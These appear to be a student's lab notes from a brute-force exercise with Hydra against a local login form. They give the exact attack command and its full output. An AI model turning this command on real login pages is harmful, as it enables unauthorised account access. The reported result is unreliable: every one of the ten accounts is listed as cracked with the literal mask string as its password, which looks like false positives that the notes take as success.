
### Command
Only command that worked was something like this with the mask:
hydra -L user.txt -p iamven?a?a?a?a?a?a 127.0.0.1 -s 8000 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid login"
It did not let me create any bigger attack than this, because i got error for trying to create 4 billion password attack.

### Time
Time was less than 10 seconds.

### Output
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-18 14:34:33
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking http-post-form://127.0.0.1:8000/login:username=^USER^&password=^PASS^:F=Invalid login
[8000][http-post-form] host: 127.0.0.1   login: darkknight@gothamwatch.org   password: iamven?a?a?a?a?a?a
[8000][http-post-form] host: 127.0.0.1   login: whatsupdoc@looneytunes.tv   password: iamven?a?a?a?a?a?a
[8000][http-post-form] host: 127.0.0.1   login: doh@springfieldpower.net   password: iamven?a?a?a?a?a?a
[8000][http-post-form] host: 127.0.0.1   login: chimichanga@fourthwall.com   password: iamven?a?a?a?a?a?a
[8000][http-post-form] host: 127.0.0.1   login: iamyourfather@deathstar.gov   password: iamven?a?a?a?a?a?a
[8000][http-post-form] host: 127.0.0.1   login: elementary@221bbaker.uk   password: iamven?a?a?a?a?a?a
[8000][http-post-form] host: 127.0.0.1   login: genius@starkindustries.com   password: iamven?a?a?a?a?a?a
[8000][http-post-form] host: 127.0.0.1   login: whysoserious@gothamchaos.net   password: iamven?a?a?a?a?a?a
[8000][http-post-form] host: 127.0.0.1   login: quackattack@duckburg.org   password: iamven?a?a?a?a?a?a
[8000][http-post-form] host: 127.0.0.1   login: ruhroh@mysterymachine.com   password: iamven?a?a?a?a?a?a
1 of 1 target successfully completed, 10 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-18 14:34:33
